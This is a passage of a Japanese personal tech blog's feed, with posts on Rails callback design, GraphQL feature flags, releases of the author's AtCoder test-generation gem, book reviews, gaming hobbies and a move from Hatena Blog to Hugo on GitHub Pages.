この本ではコントローラーでCallbackを多用するのはやめようという話がでているが、モデルでもあまり使いたくないと思っている。（この本の中でもモデルのCallbackの有用性には懐疑的な記述があった。）&lt;br>
個人的に、ビジネスロジックをARオブジェクトに書くのが駄目なのではなく、その時の機能開発の局所解をCallbackに突っ込むのが駄目だと思っている。CallbackやValidationは全てのインスタンス生成に関わってくるので慎重に書いていきたい。&lt;/p>
&lt;p>コードで例えると&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby">before_create &lt;span style="color:#66d9ef">do&lt;/span>
self&lt;span style="color:#f92672">.&lt;/span>other_model&lt;span style="color:#f92672">.&lt;/span>create!
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>↑は多分これからこのモデルが拡張されるたびにどんどん邪魔になっていくと思う。other_modelが拡張されても辛いと思う。&lt;/p>
&lt;p>同僚氏がCallbackを使わずに↓のようなコードを書いているのを見つけていいと思ったので自分は真似している。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">do_something&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span>
self&lt;span style="color:#f92672">.&lt;/span>other_model&lt;span style="color:#f92672">.&lt;/span>create!
save!
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これならこのメソッドでインスタンス生成している場所しか影響はでない。
このメソッドを使わないと永続化したいレコードが永続化できないというトレードオフは当然存在するのでこれが完全正解とは思わないが、拡張性の高さと実装をサッとするのちょうど中間をとってる感じがする。&lt;/p>
&lt;h2 id="business-logic-does-not-go-in-active-records">Business Logic (Does Not Go in Active Records)
&lt;span>&lt;a href="#business-logic-does-not-go-in-active-records">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>皆大好きこの手の話。最初っからこの方針で書いていくならありだと思う。&lt;br>
ビジネスロジックが一番安定度が低いはそれはそう。書籍クリーンアーキテクチャを読んでいて自分の中で一番咀嚼できなかった事である。ビジネスロジックが一番ボコスカ変わるし、むしろRDB使ってるとかWebアプリであることとかのほうが安定している気がしている。&lt;br>
この本のようにクラスで分割するのは一つの手法としては納得する。Pure Rubyオブジェクトを使ってドメイン知識を書いたほうが取り回しやすいしテストもしやすい。しかし、どのクラスに何を書くかの判断を正確に行う必要があるし、開発者次第でapp/form,app/decoraterやらどんどんパスが増えていって実装時に迷ってしまうトレードオフもあると思う。クラスの責務を最小化できるのはいいけど、それするならRailsじゃなくてもいいのでは？と思う。&lt;br>
自分的にはCallbackの所で書いたように、影響が大きいCallbackの使用を控えめにしてメソッドをバンバンモデルに生やすくらいが、「どこになにをかくか迷わない」と「ビジネスロジックがビジネスロジックの邪魔をする」の２つに向き合ういい感じの中間択だと思っている。&lt;/p>
&lt;h2 id="まとめ">まとめ
&lt;span>&lt;a href="#%e3%81%be%e3%81%a8%e3%82%81">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>途中から賛成とか反対とかを書いてない中途半端なブログになってしまった。&lt;br>
正直自分は開発してるときはとりあえずモデルにロジックがあってしっかりテストしてあればオッケーくらいの温度感で開発してるのであんまりブログでRailsのアーキテクチャにどうこう言う機会はなかったが、改めて読んでみると自分の考えとそのトレードオフを再考するいいきっかけになった。&lt;br>
あとこういった設計本としては珍しく、ちゃんとビジネスについて計測しろと書いてあって良かった。ソフトウェアの目的は綺麗なコードではなく人をハッピーにすることだと思うので、この意見には賛成です。&lt;/p></description></item><item><title>システム運用アンチパターンを読んだ</title><link>https://qwyng.dev/posts/20220504/</link><pubDate>Wed, 04 May 2022 15:06:56 +0900</pubDate><guid>https://qwyng.dev/posts/20220504/</guid><description>&lt;p>読んだだけで何もしていないので何もしていない。&lt;br>
せっかくなので読んでいて自分たちで実践できそうと思ったことを社外秘が漏れない程度に書いていく。&lt;/p>
&lt;h3 id="ポストモーテム作成時にシステムの期待と現実の把握がしたいことを共有する">ポストモーテム作成時にシステムの期待と現実の把握がしたいことを共有する
&lt;span>&lt;a href="#%e3%83%9d%e3%82%b9%e3%83%88%e3%83%a2%e3%83%bc%e3%83%86%e3%83%a0%e4%bd%9c%e6%88%90%e6%99%82%e3%81%ab%e3%82%b7%e3%82%b9%e3%83%86%e3%83%a0%e3%81%ae%e6%9c%9f%e5%be%85%e3%81%a8%e7%8f%be%e5%ae%9f%e3%81%ae%e6%8a%8a%e6%8f%a1%e3%81%8c%e3%81%97%e3%81%9f%e3%81%84%e3%81%93%e3%81%a8%e3%82%92%e5%85%b1%e6%9c%89%e3%81%99%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>「システムの全体像の期待と現実が異なっていたとき障害が発生しやすい」というのはかなり納得できる意見。期待と現実のギャップに気づきたいことを事前に共有した上でインシデントの振り返りを行うと、メンバーから具体的イメージが出てきやそうなのでやっていきたい。&lt;/p>
&lt;h3 id="ドキュメントにはトレードオフを書く">ドキュメントにはトレードオフを書く
&lt;span>&lt;a href="#%e3%83%89%e3%82%ad%e3%83%a5%e3%83%a1%e3%83%b3%e3%83%88%e3%81%ab%e3%81%af%e3%83%88%e3%83%ac%e3%83%bc%e3%83%89%e3%82%aa%e3%83%95%e3%82%92%e6%9b%b8%e3%81%8f">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>これは昔同僚氏も話していたことで納得した。具体的な実装の中身より戦略のほうが「過去の情報」と捉えやすいし効果が高そう。また、深く詳細を書きすぎても誰も読まないという点も留意しておきたい。&lt;/p>
&lt;h3 id="機能フラグを使う">機能フラグを使う
&lt;span>&lt;a href="#%e6%a9%9f%e8%83%bd%e3%83%95%e3%83%a9%e3%82%b0%e3%82%92%e4%bd%bf%e3%81%86">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>触ってるプロダクトがGraphQLサーバーとそこにクエリを投げるSPAという構成なのだけれど、新機能作るときにフロントエンドも少しづつ作りなおすので顧客に途中の状態を露出できずにわりとビックバンリリースになりがちである。&lt;br>
GraphQLサーバーだけ先にリリースするのはGraphQLスキーマが破壊的変更されている場合にSPAが対応できないため難しい。&lt;br>
上記のような困りがあったため機能フラグというのは特に運用していなかったのだけれど、システム運用アンチパターンを読んで改めて考えてみることにした。&lt;br>
一個浮かんだ案としては、directiveを使って以下のようにサーバ側では同名で型の違うfieldを2つ実装しておき、クライアントにはどちらかしか露出させないというもの。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-graphql" data-lang="graphql">&lt;span style="color:#66d9ef">directive&lt;/span> &lt;span style="color:#a6e22e">@flagged&lt;/span>(
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74"> Flags to check for this schema member
&lt;/span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
by: [&lt;span style="color:#a6e22e">String&lt;/span>!]!
) &lt;span style="color:#66d9ef">on&lt;/span> &lt;span style="color:#66d9ef">ARGUMENT_DEFINITION&lt;/span> | &lt;span style="color:#66d9ef">ENUM&lt;/span> | &lt;span style="color:#66d9ef">ENUM_VALUE&lt;/span> | &lt;span style="color:#66d9ef">FIELD_DEFINITION&lt;/span> | &lt;span style="color:#66d9ef">INPUT_FIELD_DEFINITION&lt;/span> | &lt;span style="color:#66d9ef">INPUT_OBJECT&lt;/span> | &lt;span style="color:#66d9ef">INTERFACE&lt;/span> | &lt;span style="color:#66d9ef">OBJECT&lt;/span> | &lt;span style="color:#66d9ef">SCALAR&lt;/span> | &lt;span style="color:#66d9ef">UNION&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">Introspection with &amp;#39;ADMIN&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">type&lt;/span> &lt;span style="color:#a6e22e">User&lt;/span> {
　name: &lt;span style="color:#a6e22e">String&lt;/span>!
profile: &lt;span style="color:#a6e22e">String&lt;/span>! &lt;span style="color:#a6e22e">@flagged&lt;/span>(by: [&lt;span style="color:#e6db74">&amp;#34;ADMIN&amp;#34;&lt;/span>])
}
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">Introspection with &amp;#39;NOT_ADMIN&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">type&lt;/span> User {
name: &lt;span style="color:#a6e22e">String&lt;/span>!
profile: &lt;span style="color:#a6e22e">UserProfile&lt;/span>! &lt;span style="color:#a6e22e">@flagged&lt;/span>(by: [&lt;span style="color:#e6db74">&amp;#34;NOT_ADMIN&amp;#34;&lt;/span>)
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>デプロイへの恐怖心の原因の一つであるコードのリリースと顧客への周知の帳尻を合わせを解消できそうなのでGW明け試してみたい。&lt;/p></description></item><item><title>GreenDay 0.5.0をリリースした</title><link>https://qwyng.dev/posts/20220430/</link><pubDate>Sat, 30 Apr 2022 20:00:10 +0900</pubDate><guid>https://qwyng.dev/posts/20220430/</guid><description>&lt;p>先日、ありがたいことにGreenDayにPRを送ってもらった。
&lt;a href="https://github.com/QWYNG/green_day/pull/43">https://github.com/QWYNG/green_day/pull/43&lt;/a>&lt;br>
そのままマージさせて頂いたのだけれど、コメントにもある通りAtcoderはわりと自由に問題のURLを設定しているっぽいので、コンテスト名から問題のURLを推測するのではなくHTMLから問題のURLを抽出する方式に変更した。これでHTMLで表示されていた問題名と異なるファイル名が生成されてしまう問題は解消したと思う。&lt;/p>
&lt;p>GitHubのリリース機能初めてつかったけどコミット一覧とかリリースノートに簡単に記載できて便利。&lt;br>
&lt;a href="https://github.com/QWYNG/green_day/releases/tag/v0.5.0">https://github.com/QWYNG/green_day/releases/tag/v0.5.0&lt;/a>&lt;/p>
&lt;p>GreenDayをいじるたびに「そもそもお前自身がアルゴリズムがんばれよ」という内なる声に苛まれる問題は未だ解消されていない。&lt;/p></description></item><item><title>Production Ready GraphQLを読んだ</title><link>https://qwyng.dev/posts/20220424/</link><pubDate>Sun, 24 Apr 2022 20:00:10 +0900</pubDate><guid>https://qwyng.dev/posts/20220424/</guid><description>&lt;p>GraphQLについて仕事で使ってるわりになんも考えてないなと最近感じたので、大好評発売中Production Ready GraphQLを読んだ。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">&lt;a href="https://t.co/MyoD0M1FQ7">https://t.co/MyoD0M1FQ7&lt;/a>&lt;br>&lt;br>読んだ、コードファーストでもスキーマファーストでもないハイブリットな実装方法は僕がスキーマファーストと呼んでいたものだったな&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1518099905759576064?ref_src=twsrc%5Etfw">April 24, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">EdgeTypeに色々コレクションごとのfieldを生やせるからEdgeTypeは便利って書いてあったが、別にConnectionTypeに直接はやしてもいいと思ったのだがどうなんだろう&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1518101098003070978?ref_src=twsrc%5Etfw">April 24, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>TypeとユニークなIDをを利用したID表現、カスタムScalarの活用、Dateloader、コードファーストとスキーマファーストのハイブリッドあたりは普段の開発でも行っていた or 意識していたが、DateLoaderを用いたキャッシュやPersistedQueryについては考えたことすらなかった。&lt;br>
思うに「フロントエンドがなんとなく開発しやすそうだから」以上の考えがなかったように思う。&lt;br>
&lt;del>あと多分クライアントの種類が複数あるようなプロダクトじゃないとGraphQLあんまり意味ない説もでてきている&lt;/del>&lt;/p>
&lt;p>&lt;a href="https://engineering.mercari.com/blog/entry/20220303-concerns-with-using-graphql/">メルカリのGraphQLについての記事&lt;/a>を読んでもまだまだ自分が考慮していないことは山ほどあり、自分は一つの技術に対して真剣に向き合っていないなぁと思うばかりである。&lt;/p></description></item><item><title>四年ぶりのMTG（会議じゃない方）</title><link>https://qwyng.dev/posts/20220202/</link><pubDate>Wed, 02 Feb 2022 22:33:10 +0900</pubDate><guid>https://qwyng.dev/posts/20220202/</guid><description>&lt;p>四年ぶりに友達と統率者戦をやることになりカードを買い始めた。MTGは大学時代に好きだった趣味だけど、今はお金に糸目付けなくて済むので更に楽しい。&lt;br>
統率者戦はウィノータを組んで池袋でスペースを借りて一日中遊んでいたのだが、楽しすぎて時間があっという間に過ぎた。&lt;br>
統率者戦でMTGの楽しさを思い出し、昔使っていたレガシーのURデルバーをもう一度使いたいなぁと思っていた所にラバガンの禁止が入ったのでこれ朗報と現代のパーツを色々買ってデッキをアップデートした。&lt;br>
猿の枠にはネメシス、速槍、チェンライと思い出カードを詰め込んだ。どれも昔自分と一緒に戦ってくれたカードで、スリーブを詰め直すだけでも懐かしかった。後自分のカードのシャカパチ曲がりが酷すぎて笑ってしまった。&lt;/p>
&lt;p>手始めに晴れる屋横浜店の休日大会と信心亭の平日レガシーに出た。2-1、,2-1(Bye込み）と一応勝ち越せたがデルバーの誘発忘れたり人間指定疫病が場にあるのにデルバー出そうとしたりプレイングは酷いもんだった。
エモシーンとして除去の的になっている媒介者や執政の横で速槍がパワー5になって殴るという局面があり、サイン付きのお気に入りのカードがまた活躍している様に泣きそうになってしまった。&lt;br>
対戦相手も良い人ばかりで、MTGコンパニオンに驚愕してる自分に色々現代の大会方式を教えてくれたり雑談に付き合ってくれたりと存分に対面MTGを楽しめた。&lt;/p>
&lt;p>最近のカードについての感想だが、濁浪の執政の強さにも驚いたが対戦相手の緑のカードがどれも強くて驚いた、ウーロが何故か攻撃するたびに能力が誘発していて頭がどうにかなりそうだったし、忍耐で戦略が吹っ飛んだりした。&lt;br>
後4マナカーンからマイコシンスだされてテキストを確認したら全てが止まる実績も解除した。&lt;/p>
&lt;p>商品で貰ったポイントを使ってミシュラのガラクタを買った。ちょっとづつデッキを強化している感じで楽しい。また暇ができたら大会に出よう。&lt;/p></description></item><item><title>GreenDay 0.4.0をリリースした</title><link>https://qwyng.dev/posts/20210117_greanday_0_4_0/</link><pubDate>Mon, 17 Jan 2022 21:39:08 +0900</pubDate><guid>https://qwyng.dev/posts/20210117_greanday_0_4_0/</guid><description>&lt;p>自作のAtCoderのテスト自動生成Gemのversion0.4.0を公開した。&lt;br>
&lt;a href="https://rubygems.org/gems/green_day">https://rubygems.org/gems/green_day&lt;/a>&lt;/p>
&lt;p>今回はコンテストの問題数がA to Zの26問以上あっても26問目までしかテストが生成されないことを解決した。
たまたま勉強に使った&lt;a href="https://atcoder.jp/contests/typical90">競プロ典型 90 問&lt;/a>に問題が大量にあったので判明したバグ。&lt;br>
ついでにRuboCopさんに注意されたので&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ruby" data-lang="ruby"> spec&lt;span style="color:#f92672">.&lt;/span>metadata&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;rubygems_mfa_required&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;true&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>も足して多要素認証必須にしておいた。後CIでのRubyで3.1.0を使うようにした。&lt;br>
faraday 2系にも対応したいし色々やることがある。&lt;/p></description></item><item><title>『研鑚Rubyプログラミング』β版　を読んだ</title><link>https://qwyng.dev/posts/20210103kensan-ruby/</link><pubDate>Tue, 04 Jan 2022 15:50:56 +0900</pubDate><guid>https://qwyng.dev/posts/20210103kensan-ruby/</guid><description>&lt;p>タイトルどおりラムダ書籍さんから大好評発売中の&lt;a href="https://www.lambdanote.com/collections/ruby">『研鑚Rubyプログラミング』β版&lt;/a>を読んだ。&lt;/p>
&lt;p>翻訳がまだ途中なのでβ版。内容が３部構成なんだけど最初の一部のみ翻訳が完了していて、他の二部は翻訳作業中とのこと。とはいえその翻訳中の部も正式ではないものの日本語化された文章が存在するので一応内容を全て日本語で把握することは可能。
ざっと読み終えたので良かったところを書いていく。&lt;/p>
&lt;h3 id="トレードオフを理解しろと書かれている">トレードオフを理解しろと書かれている
&lt;span>&lt;a href="#%e3%83%88%e3%83%ac%e3%83%bc%e3%83%89%e3%82%aa%e3%83%95%e3%82%92%e7%90%86%e8%a7%a3%e3%81%97%e3%82%8d%e3%81%a8%e6%9b%b8%e3%81%8b%e3%82%8c%e3%81%a6%e3%81%84%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>この本にはRubyの実践的なテクニックがたくさん書いてあるのだけれど、そのテクニックに対してちゃんとトレードオフが言語化してある。例えばActiveRecordとSequelどちらを使うかといった話なら、ActiveRecordには外部ライブラリが数多く存在して開発が捗るし、Sequelなら実行性能やエラー検知に優れている、という様にメリデメがしっかり書かれていた。
URL構造をネストにする時フラットにする時のメリデメ比較もウェブサービス作っているなら参考になると思う。より具体なメソッドの数と複雑性やテストの抽象化等、コードに対してプログラマが悩みがちなことについても書かれている。&lt;br>
技術のトレードオフをちゃんと理解しろという強いメッセージを感じた。&lt;/p>
&lt;h3 id="ライブラリを開発する人向けの助言が多い">ライブラリを開発する人向けの助言が多い
&lt;span>&lt;a href="#%e3%83%a9%e3%82%a4%e3%83%96%e3%83%a9%e3%83%aa%e3%82%92%e9%96%8b%e7%99%ba%e3%81%99%e3%82%8b%e4%ba%ba%e5%90%91%e3%81%91%e3%81%ae%e5%8a%a9%e8%a8%80%e3%81%8c%e5%a4%9a%e3%81%84">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>Module#autoloadの実践例や後方互換性を意識したコード等Rubyでライブラリを書く人向けの助言も多かった。自分でライブラリを書いている人は読むとライブラリ設計に関する道具箱が格段に増えると思う。&lt;br>
またプラグイン設計や定数探索についても詳しく記載されていて、普段プラグインが導入されているような大きめのライブラリを開発で使っている人なら仕組みを知っておくと業務でのデバックも捗りそうだと感じた。&lt;/p>
&lt;h3 id="vmメモリ実行性能に関する技術">VM、メモリ、実行性能に関する技術
&lt;span>&lt;a href="#vm%e3%83%a1%e3%83%a2%e3%83%aa%e5%ae%9f%e8%a1%8c%e6%80%a7%e8%83%bd%e3%81%ab%e9%96%a2%e3%81%99%e3%82%8b%e6%8a%80%e8%a1%93">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>正直デフォルト引数のオブジェクト生成コストを気にしたことはなかったしSetの中身Hashなこと知らなかったし
raiseに空配列渡してバックトレースを消して実行性能を向上させようと考えたこともない。&lt;br>
それらの選択が絶対的に良いものだとは思わないが選択肢の一つであることには違いないので、Rubyを書く時の選択肢をもっと増やしたいと思っている人にはオススメできる。&lt;/p>
&lt;h3 id="まとめ">まとめ
&lt;span>&lt;a href="#%e3%81%be%e3%81%a8%e3%82%81">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>Rubyのコードをもっと良くしたいと思っている人は読むといいんじゃなかろうか。&lt;br>
ライブラリ開発やウェブ開発以外にも引数や変数の使い分けといった原則にも触れられているので普段の開発におけるRubyのコードにも活かせる点が数多く存在すると思う。&lt;br>
とりあえず自分も自作Gemを磨き治すぞo(^-^)o&lt;/p></description></item><item><title>LOLおじさんからみるポケモンユナイト</title><link>https://qwyng.dev/posts/2022-1-2/</link><pubDate>Sun, 02 Jan 2022 16:07:59 +0900</pubDate><guid>https://qwyng.dev/posts/2022-1-2/</guid><description>&lt;p>年始に社の人達(+そのパートナーの方)と下の大会にでることになった。&lt;br>
&lt;a href="https://www.pokemonunite.jp/ja/news/30/">Pokémon UNITE Winter Tournamentを開催！&lt;/a>&lt;br>
LOL&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>をかれこれ7年近くやっているMOBAおじさんなので喜んで参加させて貰った。ちなみにLOLの最高レートはD2&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>です。&lt;/p>
&lt;p>12月終わりに参加が決まり、年末はとりあえずマスターになるまでやったのでLOLおじさんがLOLとの比較を書いてく。&lt;/p>
&lt;h3 id="キルがそんなに重要じゃない">キルがそんなに重要じゃない
&lt;span>&lt;a href="#%e3%82%ad%e3%83%ab%e3%81%8c%e3%81%9d%e3%82%93%e3%81%aa%e3%81%ab%e9%87%8d%e8%a6%81%e3%81%98%e3%82%83%e3%81%aa%e3%81%84">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>正直LOLで序盤に2デスしたらほぼレーン戦は終わる。がユナイトは死んでも育ってない限り相手にあまり経験値を渡さないしゴールドも貰えない。
相手をキルしても思ったより差が開かないのである。これはLOLから来た身分だと新鮮で、最初は瀕死の敵を多少無理しても回収したり1v1で勝てる場面は絶対に仕掛けていたが、リスクの割にリターンが釣り合っていない行動だと気づいてからはレートが上がり始めた。&lt;br>
ユナイトだったら序盤例えばダンベル鍛える為に多少デスしても正直問題ない。中盤でも活躍してない限り復活時間が短いので相手を一人キャッチして倒してもすぐ復活して戻ってきてしまう。なので1対1で勝ってオブジェクトにつなげる動きがやりにくい。集団戦で複数人同時に倒さないとオブジェクトが取りにくいゲームだと思う。&lt;br>
とはいえ、点数を落とさせることが重要な局面も多いし、育っている敵を倒した時の経験値は大きい。負けているときはキルを狙う価値はある。&lt;/p>
&lt;h3 id="ユナイト技が強すぎる">ユナイト技が強すぎる
&lt;span>&lt;a href="#%e3%83%a6%e3%83%8a%e3%82%a4%e3%83%88%e6%8a%80%e3%81%8c%e5%bc%b7%e3%81%99%e3%81%8e%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>ユナイト技が本当に強い。LOLでもアルティメットというユナイト技に相当するスキルがあるんだけどアルティメットを1とするとユナイト技は10ぐらいある。1対1で敵をキルするためにユナイトを打つのは正直もったいないのでカメやサンダー戦でだけ打つようにしたほうが安定する。&lt;/p>
&lt;h3 id="カメゲー">カメゲー
&lt;span>&lt;a href="#%e3%82%ab%e3%83%a1%e3%82%b2%e3%83%bc">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>カメゲー ≒ 経験値ゲー。&lt;br>
チームだとゴールマクロ等カメじゃなくてロトムを優先する強い戦術もあるんだけどソロランクは先に下レーンを割ってカメとったらほぼ勝てる。レベル差がLOL以上に重要なゲームなので、カメ2つ取られてると確実にレベル差がついてしまい、相手がサンダー触れないように立ち回ってくるとほぼ勝てない。 1-1-3&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>も上位では流行ってるらしい。&lt;/p>
&lt;h3 id="集団戦は難しい">集団戦は難しい
&lt;span>&lt;a href="#%e9%9b%86%e5%9b%a3%e6%88%a6%e3%81%af%e9%9b%a3%e3%81%97%e3%81%84">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>スキル一つ一つが強力で有効活用できなかった時のリカバリーは難しい。特に集団戦は相手のアタッカーにきれいにフォーカスしたいので相手のCCやユナイト技の有無は把握しておく必要がある。まぁここは正直LOLと同じ。&lt;/p>
&lt;h3 id="カイリュー">カイリュー
&lt;span>&lt;a href="#%e3%82%ab%e3%82%a4%e3%83%aa%e3%83%a5%e3%83%bc">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>やってることがおかしい。&lt;/p>
&lt;h3 id="まとめ">まとめ
&lt;span>&lt;a href="#%e3%81%be%e3%81%a8%e3%82%81">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>ポケモンは大学生の時やっていたし、そのキャラクターを使ってMOBAできるのは感慨深い。&lt;br>
ゲーム性がLOLとけっこう違うし試合が10分で終わるのでストレスも少ない。&lt;br>
不満点はマウスとキーボードで操作したいぐらい。神ゲー。&lt;/p>
&lt;section class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1" role="doc-endnote">
&lt;p>ユナイトと同じMOBAというジャンルで世界的に人気なゲーム。&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:2" role="doc-endnote">
&lt;p>上位0.26%、とはいえ自分より100倍うまい人間がうじゃうじゃいる。&amp;#160;&lt;a href="#fnref:2" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:3" role="doc-endnote">
&lt;p>上1人中央1人下3人&amp;#160;&lt;a href="#fnref:3" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/section></description></item><item><title>はてなブログからHugo + GitHub Pagesに引っ越した</title><link>https://qwyng.dev/posts/2021-1-1/</link><pubDate>Sun, 02 Jan 2022 00:22:50 +0900</pubDate><guid>https://qwyng.dev/posts/2021-1-1/</guid><description>&lt;p>&lt;a href="https://qwyng.dev/posts/2021/12/30/191311">去年の振り返りで書いた通り&lt;/a>はてなブログが嫌になってきたのでGitHub Pagesに移行した。&lt;br>
このテーマを書きましょう！みたいなキャンペーンが押し付けがましく感じたり、ログイン導線がめんどかったりが嫌になった原因。エディタがもっさりしていて辛かったのもある。&lt;/p>
&lt;h2 id="ドメインqwyngdevの理由">ドメイン(qwyng.dev)の理由
&lt;span>&lt;a href="#%e3%83%89%e3%83%a1%e3%82%a4%e3%83%b3qwyngdev%e3%81%ae%e7%90%86%e7%94%b1">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>せっかくなのでちゃんとドメインも買った。&lt;code>qwy.ng&lt;/code>はナイジェリアに在住する必要があり、&lt;code>qwyn.gg&lt;/code>は年間10kもするので仕方なしで&lt;code>qwyng.dev&lt;/code>にした。
devドメインだとHSTSが効くというメリットも（一応）存在するのでまぁいいでしょう。&lt;br>
ドメインはGoogle Domainsで買った。単純に調べた中で.devドメインが一番安かったのが選定理由。GUIちゃんとしてるし認証も二要素だし。&lt;br>
ブログ名だが、Tallmanというブログ名も嫌いではなかったが私的にはQWYNGという名前が一番自分の名札としてしっくりくるのでブログ名もドメイン名に合わせた。&lt;/p>
&lt;h2 id="hugoにした理由">Hugoにした理由
&lt;span>&lt;a href="#hugo%e3%81%ab%e3%81%97%e3%81%9f%e7%90%86%e7%94%b1">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>静的サイトジェネレーターの選定だが、yarnやnpmはターミナルにあんまり入力したくない&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>のでJS系統の静的サイトジェネレーターはパス、いつもはRubyがメインだしGithub Pagesにホストしてもらう予定だったのでjekyllが良さそうと考えたがイマイチ好みのテンプレートが見つからなかった。最終的に好みのテンプレートを見つけたのでHugoにした。&lt;/p>
&lt;h2 id="github-pagesにした理由">GitHub Pagesにした理由
&lt;span>&lt;a href="#github-pages%e3%81%ab%e3%81%97%e3%81%9f%e7%90%86%e7%94%b1">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>前提として記事を投稿したら草が生えたほうがモチベが上がりそうなのでソースはGitHubでホスティングする。&lt;br>
ビルド成果物のホスティング先はスケーリングがネックになることは考えづらいので利便性重視で選んだ。&lt;br>
&lt;a href="https://gohugo.io/hosting-and-deployment">Hugoのデプロイとホスティングに関するドキュメント&lt;/a>を読むとGitHub PagesがGitHub ActionとCNAMEの追加だけで良さそうだったのでそれにした。触るドメインは少ないほうが楽。
他はソースコードホスティングしているサイト以外で何かしら設定しなきゃいけないしツールチェーンが別に必要だったりしたのでやめた。&lt;/p>
&lt;h2 id="はてなブログからの引っ越し方法">はてなブログからの引っ越し方法
&lt;span>&lt;a href="#%e3%81%af%e3%81%a6%e3%81%aa%e3%83%96%e3%83%ad%e3%82%b0%e3%81%8b%e3%82%89%e3%81%ae%e5%bc%95%e3%81%a3%e8%b6%8a%e3%81%97%e6%96%b9%e6%b3%95">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>&lt;code>はてなブログ hugo 移行&lt;/code>でググってたら&lt;a href="https://yusukebe.com/posts/2020/hatenablog-to-githubpages/">こちらの記事&lt;/a>から&lt;a href="https://github.com/mosuke5/hatena-blog-parser">mosuke5/hatena-blog-parser&lt;/a>というはてなブログのエクスポートファイルからmarkdownに変換してくれるRubyスクリプトを見つけたので使わせて貰った。昔のスクリプトなので多少警告はでたものの問題なく使用できた。製作者様ありがとうございます。最高です。&lt;br>
はてなブログの方はnoindex貼って検索エンジンから除外した。&lt;/p>
&lt;h3 id="まとめ">まとめ
&lt;span>&lt;a href="#%e3%81%be%e3%81%a8%e3%82%81">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>というわけで2022年の目標である「自分のドメインでブログを開設する」を早速達成したので偉い！&lt;br>
